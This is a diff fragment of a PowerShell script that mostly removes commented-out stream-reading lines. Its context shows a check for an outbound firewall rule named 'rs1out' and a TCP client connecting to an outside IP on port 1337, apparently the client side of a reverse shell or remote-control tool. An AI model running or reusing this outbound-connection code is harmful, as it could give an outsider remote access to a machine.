@@ -10,6 +10,7 @@ if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
 	Write-Output "Rule already exists";
 }
 
+
 try {
 	$client = New-Object System.Net.Sockets.TCPClient("73.113.78.58", 1337);
 	$stream = $client.GetStream();
@@ -31,18 +32,7 @@ try {
 		}
 		Write-Output $in_buff;
 	}
-	
-	#$in_buff = $reader.ReadLine();
-	#Write-Output $in_buff;
-	#$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-	
-	#$i = $stream.Read($bytes, 0, $bytes.Length)
-
-	
-	
 	$client.Close()
-
-	
 }
 catch {
 	Write-Output $_;
